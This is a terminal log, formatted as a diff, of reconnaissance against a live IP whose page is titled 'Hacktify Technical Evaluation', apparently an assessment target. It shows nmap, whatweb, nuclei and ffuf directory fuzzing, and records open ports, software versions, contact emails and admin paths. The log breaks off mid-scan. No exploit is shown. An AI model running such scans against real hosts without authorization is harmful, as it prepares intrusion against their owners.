@@ -1,0 +1,1090 @@
+┌──(guts㉿kali)-[~]
+└─$ nmap -Pn -T4 104.156.254.36 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-30 00:06 +0530
+Nmap scan report for 104.156.254.36.vultrusercontent.com (104.156.254.36)
+Host is up (0.26s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE
+22/tcp  open   ssh
+80/tcp  open   http
+443/tcp closed https
+
+Nmap done: 1 IP address (1 host up) scanned in 16.35 seconds
+
+
+┌──(guts㉿kali)-[~]
+└─$ whatweb http://104.156.254.36/
+http://104.156.254.36/ [200 OK] Apache[2.4.52], Country[UNITED STATES][US], Email[naman@hacktify.org,rohit@hacktify.in], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[104.156.254.36], Script, Title[Hacktify Technical Evaluation]
+                                                              
+┌──(guts㉿kali)-[~]
+└─$ nuclei -u http://104.156.254.36/ 
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.0
+
+                projectdiscovery.io
+
+[INF] Your current nuclei-templates v10.4.6 are outdated. Latest is v10.4.8
+^C
+                                                              
+┌──(guts㉿kali)-[~]
+└─$ nuclei -update                   
+flag provided but not defined: -update
+                                                              
+┌──(guts㉿kali)-[~]
+└─$ nuclei -update-templates
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.0
+
+                projectdiscovery.io
+
+[INF] No new updates found for nuclei templates
+                                                              
+┌──(guts㉿kali)-[~]
+└─$ nuclei -u http://104.156.254.36/ 
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.0
+
+                projectdiscovery.io
+
+[INF] Current nuclei version: v3.11.0 (outdated)
+[INF] Current nuclei-templates version: v10.4.8 (latest)
+[INF] New templates added in latest release: 112
+[INF] Templates loaded for current scan: 10760
+[INF] Executing 10760 signed templates from projectdiscovery/nuclei-templates
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 2492 (Reduced 2350 Requests)
+[INF] Using Interactsh Server: oast.me
+[waf-detect:apachegeneric] [http] [info] http://104.156.254.36/
+[ssh-auth-methods] [javascript] [info] 104.156.254.36:22 ["["publickey","password"]"]                                       
+[ssh-password-auth] [javascript] [info] 104.156.254.36:22
+[ssh-server-enumeration] [javascript] [info] 104.156.254.36:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.16"]
+[ssh-sha1-hmac-algo] [javascript] [info] 104.156.254.36:22
+[openssh-detect] [tcp] [info] 104.156.254.36:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.16"]                                
+[email-extractor] [http] [info] http://104.156.254.36/ ["naman@hacktify.org"]                                               
+[apache-detect] [http] [info] http://104.156.254.36/ ["Apache/2.4.52 (Ubuntu)"]                                             
+[options-method] [http] [info] http://104.156.254.36/ ["GET,POST,OPTIONS,HEAD"]                                             
+[http-missing-security-headers:strict-transport-security] [http] [info] http://104.156.254.36/                              
+[http-missing-security-headers:content-security-policy] [http] [info] http://104.156.254.36/
+[http-missing-security-headers:x-content-type-options] [http] [info] http://104.156.254.36/
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://104.156.254.36/                      
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://104.156.254.36/                           
+[http-missing-security-headers:permissions-policy] [http] [info] http://104.156.254.36/                                     
+[http-missing-security-headers:x-frame-options] [http] [info] http://104.156.254.36/
+[http-missing-security-headers:referrer-policy] [http] [info] http://104.156.254.36/
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://104.156.254.36/                             
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://104.156.254.36/                           
+[ptr-fingerprint] [dns] [info] 36.254.156.104.in-addr.arpa ["104.156.254.36.vultrusercontent.com."]                         
+[INF] Scan completed in 5m. 20 matches found.
+[INF] HTTP connections: 13546 total, 1341 new, 12205 reused (90.1%)
+
+
+
+
+└─$ ffuf -u "http://104.156.254.36/tms/FUZZ" -w /usr/share/wordlists/dirb/common.txt -c -t 50
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://104.156.254.36/tms/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [3/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Progress: [50/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [50/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [50/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [50/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00].hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]                                                       
+:: Progress: [53/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [58/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [58/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [67/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [67/4614] :: Job [1/1] :: 68 req/sec :: Duration: [0:00:01:: Progress: [76/4614] :: Job [1/1] :: 51 req/sec :: Duration: [0:00:01:: Progress: [76/4614] :: Job [1/1] :: 51 req/sec :: Duration: [0:00:01:: Progress: [76/4614] :: Job [1/1] :: 51 req/sec :: Duration: [0:00:01:: Progress: [85/4614] :: Job [1/1] :: 42 req/sec :: Duration: [0:00:01:: Progress: [93/4614] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:01:: Progress: [96/4614] :: Job [1/1] :: 39 req/sec :: Duration: [0:00:01:: Progress: [96/4614] :: Job [1/1] :: 39 req/sec :: Duration: [0:00:01:: Progress: [107/4614] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:0:: Progress: [107/4614] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:0:: Progress: [118/4614] :: Job [1/1] :: 41 req/sec :: Duration: [0:00:0:: Progress: [118/4614] :: Job [1/1] :: 41 req/sec :: Duration: [0:00:0:: Progress: [129/4614] :: Job [1/1] :: 41 req/sec :: Duration: [0:00:0:: Progress: [129/4614] :: Job [1/1] :: 41 req/sec :: Duration: [0:00:0:: Progress: [143/4614] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:0:: Progress: [143/4614] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:0:: Progress: [158/4614] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:0:: Progress: [158/4614] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:0:: Progress: [173/4614] :: Job [1/1] :: 46 req/sec :: Duration: [0:00:0:: Progress: [173/4614] :: Job [1/1] :: 46 req/sec :: Duration: [0:00:0:: Progress: [188/4614] :: Job [1/1] :: 47 req/sec :: Duration: [0:00:0:: Progress: [188/4614] :: Job [1/1] :: 47 req/sec :: Duration: [0:00:0.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3478ms]                                                      
+:: Progress: [199/4614] :: Job [1/1] :: 46 req/sec :: Duration: [0:00:0.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3478ms]                                                      
+:: Progress: [199/4614] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:0:: Progress: [211/4614] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:0:: Progress: [211/4614] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:0:: Progress: [211/4614] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:0:: Progress: [234/4614] :: Job [1/1] :: 52 req/sec :: Duration: [0:00:0:: Progress: [234/4614] :: Job [1/1] :: 52 req/sec :: Duration: [0:00:0:: Progress: [257/4614] :: Job [1/1] :: 55 req/sec :: Duration: [0:00:0:: Progress: [257/4614] :: Job [1/1] :: 55 req/sec :: Duration: [0:00:0:: Progress: [280/4614] :: Job [1/1] :: 57 req/sec :: Duration: [0:00:0:: Progress: [280/4614] :: Job [1/1] :: 57 req/sec :: Duration: [0:00:0                        [Status: 200, Size: 14311, Words: 745, Lines: 377, Duration: 4504ms]                                                  
+:: Progress: [295/4614] :: Job [1/1] :: 58 req/sec :: Duration: [0:00:0:: Progress: [319/4614] :: Job [1/1] :: 67 req/sec :: Duration: [0:00:0:: Progress: [319/4614] :: Job [1/1] :: 67 req/sec :: Duration: [0:00:0admin                   [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 304ms]                                                       
+:: Progress: [323/4614] :: Job [1/1] :: 62 req/sec :: Duration: [0:00:0:: Progress: [350/4614] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:0:: Progress: [350/4614] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:0:: Progress: [389/4614] :: Job [1/1] :: 95 req/sec :: Duration: [0:00:0:: Progress: [389/4614] :: Job [1/1] :: 95 req/sec :: Duration: [0:00:0:: Progress: [428/4614] :: Job [1/1] :: 116 req/sec :: Duration: [0:00::: Progress: [428/4614] :: Job [1/1] :: 116 req/sec :: Duration: [0:00::: Progress: [478/4614] :: Job [1/1] :: 139 req/sec :: Duration: [0:00::: Progress: [478/4614] :: Job [1/1] :: 139 req/sec :: Duration: [0:00::: Progress: [528/4614] :: Job [1/1] :: 162 req/sec :: Duration: [0:00::: Progress: [528/4614] :: Job [1/1] :: 162 req/sec :: Duration: [0:00::: Progress: [528/4614] :: Job [1/1] :: 162 req/sec :: Duration: [0:00::: Progress: [558/4614] :: Job [1/1] :: 150 req/sec :: Duration: [0:00::: Progress: [581/4614] :: Job [1/1] :: 159 req/sec :: Duration: [0:00::: Progress: [608/4614] :: Job [1/1] :: 178 req/sec :: Duration: [0:00::: Progress: [637/4614] :: Job [1/1] :: 159 req/sec :: Duration: [0:00::: Progress: [660/4614] :: Job [1/1] :: 174 req/sec :: Duration: [0:00::: Progress: [693/4614] :: Job [1/1] :: 189 req/sec :: Duration: [0:00::: Progress: [712/4614] :: Job [1/1] :: 175 req/sec :: Duration: [0:00::: Progress: [744/4614] :: Job [1/1] :: 193 req/sec :: Duration: [0:00::: Progress: [765/4614] :: Job [1/1] :: 176 req/sec :: Duration: [0:00::: Progress: [796/4614] :: Job [1/1] :: 202 req/sec :: Duration: [0:00::: Progress: [815/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00::: Progress: [846/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00::: Progress: [866/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00::: Progress: [897/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00::: Progress: [920/4614] :: Job [1/1] :: 213 req/sec :: Duration: [0:00::: Progress: [947/4614] :: Job [1/1] :: 203 req/sec :: Duration: [0:00::: Progress: [973/4614] :: Job [1/1] :: 211 req/sec :: Duration: [0:00::: Progress: [1002/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [1024/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [1053/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [1076/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [1103/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:: Progress: [1127/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [1155/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00css                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 248ms]                                                       
+:: Progress: [1165/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [1180/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [1207/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [1232/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [1262/4614] :: Job [1/1] :: 212 req/sec :: Duration: [0:00:: Progress: [1284/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [1312/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [1334/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [1362/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [1386/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [1415/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [1438/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [1471/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [1488/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [1521/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [1540/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [1573/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [1593/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [1625/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [1645/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [1675/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [1696/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00fonts                   [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 245ms]                                                       
+:: Progress: [1699/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00forgot-password         [Status: 200, Size: 11960, Words: 690, Lines: 312, Duration: 234ms]                                                   
+:: Progress: [1709/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [1726/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [1751/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [1778/4614] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:: Progress: [1804/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [1828/4614] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:: Progress: [1856/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [1882/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [1911/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [1933/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [1962/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [1984/4614] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:: Progress: [2013/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2035/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 234ms]                                                       
+:: Progress: [2040/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00includes                [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 229ms]                                                       
+:: Progress: [2059/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [2064/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00index                   [Status: 200, Size: 14547, Words: 784, Lines: 377, Duration: 243ms]                                                   
+:: Progress: [2067/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00index.php               [Status: 200, Size: 14542, Words: 787, Lines: 377, Duration: 232ms]                                                   
+:: Progress: [2069/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00index.html              [Status: 200, Size: 14495, Words: 781, Lines: 377, Duration: 248ms]                                                   
+:: Progress: [2070/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [2085/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2116/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2139/4614] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:: Progress: [2166/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [2191/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [2217/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00js                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 240ms]                                                       
+:: Progress: [2227/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [2243/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2267/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [2296/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [2319/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [2348/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2371/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [2401/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00logout                  [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 245ms]                                                           
+:: Progress: [2411/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:: Progress: [2422/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [2453/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [2475/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [2504/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [2532/4614] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:: Progress: [2556/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [2583/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2607/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2633/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [2657/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [2683/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [2710/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [2736/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [2761/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [2787/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2812/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2839/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [2865/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00page                    [Status: 200, Size: 4775, Words: 341, Lines: 121, Duration: 237ms]                                                    
+:: Progress: [2883/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [2891/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [2919/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [2942/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [2970/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [2992/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [3021/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [3044/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [3073/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [3095/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [3127/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [3148/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [3181/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [3201/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00profile                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 251ms]                                                           
+:: Progress: [3210/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [3233/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [3253/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [3285/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [3306/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [3337/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [3357/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [3389/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [3410/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [3440/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [3461/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [3489/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [3512/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [3540/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [3565/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [3590/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [3616/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [3642/4614] :: Job [1/1] :: 203 req/sec :: Duration: [0:00:: Progress: [3667/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [3695/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [3719/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [3745/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:: Progress: [3773/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [3796/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:: Progress: [3827/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [3847/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:: Progress: [3878/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [3900/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [3929/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [3950/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [3979/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [4001/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [4030/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:: Progress: [4052/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [4082/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00thankyou                [Status: 200, Size: 10331, Words: 549, Lines: 261, Duration: 235ms]                                                   
+:: Progress: [4082/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:: Progress: [4107/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [4134/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [4162/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [4185/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [4214/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [4236/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:: Progress: [4265/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [4289/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [4315/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [4338/4614] :: Job [1/1] :: 203 req/sec :: Duration: [0:00:: Progress: [4367/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:: Progress: [4392/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [4420/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [4446/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:: Progress: [4474/4614] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:: Progress: [4498/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [4524/4614] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:: Progress: [4550/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [4575/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [4601/4614] :: Job [1/1] :: 206 req/sec :: Duration: [0:00:: Progress: [4614/4614] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:: Progress: [4614/4614] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
+           
+                                                               
+┌──(guts㉿kali)-[~]
+└─$ ffuf -u "http://104.156.254.36/tms/admin/FUZZ" -w /usr/share/wordlists/dirb/common.txt -c -t 50 -fc 404
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://104.156.254.36/tms/admin/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 404
+________________________________________________
+
+:: Progress: [1/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:: Progress: [50/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [50/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [50/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [50/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [59/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [59/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [69/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:0.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 599ms]                                             
+:: Progress: [69/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [71/4614] :: Job [1/1] :: 51 req/sec :: Duration: [0::: Progress: [78/4614] :: Job [1/1] :: 46 req/sec :: Duration: [0::: Progress: [79/4614] :: Job [1/1] :: 44 req/sec :: Duration: [0::: Progress: [79/4614] :: Job [1/1] :: 44 req/sec :: Duration: [0::: Progress: [87/4614] :: Job [1/1] :: 41 req/sec :: Duration: [0::: Progress: [87/4614] :: Job [1/1] :: 41 req/sec :: Duration: [0::: Progress: [95/4614] :: Job [1/1] :: 37 req/sec :: Duration: [0::: Progress: [95/4614] :: Job [1/1] :: 37 req/sec :: Duration: [0:.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1637ms]                                            
+:: Progress: [96/4614] :: Job [1/1] :: 32 req/sec :: Duration: [0::: Progress: [105/4614] :: Job [1/1] :: 37 req/sec :: Duration: [0:: Progress: [105/4614] :: Job [1/1] :: 37 req/sec :: Duration: [0:: Progress: [115/4614] :: Job [1/1] :: 38 req/sec :: Duration: [0:: Progress: [116/4614] :: Job [1/1] :: 35 req/sec :: Duration: [0:: Progress: [125/4614] :: Job [1/1] :: 38 req/sec :: Duration: [0:: Progress: [125/4614] :: Job [1/1] :: 38 req/sec :: Duration: [0:: Progress: [135/4614] :: Job [1/1] :: 38 req/sec :: Duration: [0:: Progress: [141/4614] :: Job [1/1] :: 38 req/sec :: Duration: [0:: Progress: [149/4614] :: Job [1/1] :: 40 req/sec :: Duration: [0:: Progress: [156/4614] :: Job [1/1] :: 40 req/sec :: Duration: [0:: Progress: [163/4614] :: Job [1/1] :: 42 req/sec :: Duration: [0:: Progress: [163/4614] :: Job [1/1] :: 42 req/sec :: Duration: [0:: Progress: [176/4614] :: Job [1/1] :: 43 req/sec :: Duration: [0:: Progress: [185/4614] :: Job [1/1] :: 43 req/sec :: Duration: [0:: Progress: [190/4614] :: Job [1/1] :: 44 req/sec :: Duration: [0:: Progress: [200/4614] :: Job [1/1] :: 44 req/sec :: Duration: [0                        [Status: 200, Size: 2096, Words: 111, Lines: 60, Duration: 3658ms]                                          
